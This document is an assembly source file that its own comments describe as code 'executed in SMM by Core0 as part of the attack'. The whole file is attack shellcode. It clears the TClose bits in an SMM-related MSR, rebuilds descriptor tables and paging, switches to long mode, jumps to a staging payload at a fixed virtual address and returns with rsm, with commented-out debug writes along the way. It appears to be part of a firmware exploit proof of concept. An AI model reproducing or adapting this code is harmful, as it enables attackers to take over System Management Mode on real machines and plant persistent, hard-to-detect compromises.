

%define PROTECT_MODE_CS 0x08
%define PROTECT_MODE_DS 0x20
%define LONG_MODE_CS 	0x38
%define TSS_SEGMENT 	0x40
%define LONG_MODE_DS	0x48

%define ORIGINAL_GDTR			0x1400
%define SQUIRREL_BAR 			0xd0800000
%define CORE0_INITIAL_STACK		0x1E00
%define CORE0_PAGE_TABLE_BASE   0x2000
%define CORE0_NEXT_STAGE        0x1035

%define X64_STAGING_FUNC_VA		0xfffff6fb7dbee000
%define X64_STAGING_RSP			0xfffff6fb7dbef000

%define IA32_EFER				0xC0000080

%define CORE1_MUTEX_SIGNAL_ADDR	0x3220


global _core0_shell

section .text

; This code is executed in SMM by Core0 as part of the attack
[bits 32]
_core0_shell:
    
	; Clear TClose
	mov ecx,0xc0010113
	rdmsr
	and eax,0xfffffff3
	wrmsr

	mov     ax, PROTECT_MODE_DS
o16 mov     ds, ax
o16 mov     es, ax
o16 mov     fs, ax
o16 mov     gs, ax
o16 mov     ss, ax
    mov esp, CORE0_INITIAL_STACK  

	; Clean the GDT and CS
	mov ecx, ORIGINAL_GDTR
	lgdt  [ecx]

	push    PROTECT_MODE_CS             
    mov 	eax, CORE0_NEXT_STAGE
	push 	eax
	retf

next_stage:

	; mov ecx, SQUIRREL_BAR
	; lea ecx, [ecx + 0]
	; mov byte [ecx], 0xFA 
	; xor ecx,ecx

    jmp     ProtFlatMode

[BITS 64]
ProtFlatMode:
	
	; mov rcx, SQUIRREL_BAR
	; lea rcx, [rcx + 0x1]
	; mov byte [rcx], 0xFB 
	; xor rcx,rcx

	mov eax, CORE0_PAGE_TABLE_BASE
    mov     cr3, rax
    mov     eax, 0x668                   ; as cr4.PGE is not set here, refresh cr3
	mov     cr4, rax

	; mov rcx, SQUIRREL_BAR
	; lea rcx, [rcx + 0x2]
	; mov byte [rcx], 0xFC 
	; xor rcx,rcx

	; Load TSS
    sub     esp, 8                      ; reserve room in stack
    sgdt    [rsp]	
    mov     eax, [rsp + 2]              ; eax = GDT base
    add     esp, 8
    mov     dl, 0x89
    mov     [rax + TSS_SEGMENT + 5], dl ; clear busy flag
    mov     eax, TSS_SEGMENT
    ltr     ax

	; mov rcx, SQUIRREL_BAR
	; lea rcx, [rcx + 0x3]
	; mov byte [rcx], 0xFD 
	; xor rcx,rcx

	push    LONG_MODE_CS               ; push cs hardcore here
    call    Base                       ; push return address for retf later
Base:
   	add     dword [rsp], @LongMode - Base

	mov rax, [rsp]

    mov     ecx, IA32_EFER
    rdmsr
    or      ah, 1                      ; enable LME
    wrmsr
    mov     rbx, cr0
    or      ebx, 0x80010023            ; enable paging + WP + NE + MP + PE
    mov     cr0, rbx

	; mov rcx, SQUIRREL_BAR
	; lea rcx, [rcx + 0x4]
	; mov byte [rcx], 0xFE 
	; xor rcx,rcx	

    retf
	

@LongMode:
	mov     ax, LONG_MODE_DS
o16 mov     ds, ax
o16 mov     es, ax
o16 mov     fs, ax
o16 mov     gs, ax
o16	mov 	ss, ax

	mov 	rax, X64_STAGING_RSP
	add		rax, 0xF00
	mov 	rsp, rax

	; mov rcx, SQUIRREL_BAR
	; lea rcx, [rcx + 0x50]
	; mov dword [rcx], 0x41414141

	mov 	rax, X64_STAGING_FUNC_VA
	call 	rax	 

	; mov rcx, SQUIRREL_BAR
	; lea rcx, [rcx + 0x60]
	; mov dword [rcx], 0x43434343

	; Return from SMM
	rsm
	
	nop
	nop
	nop
	nop
	db 'I'
	db 'O'
	db 'A'	
	nop
	nop
	nop
	nop
	nop

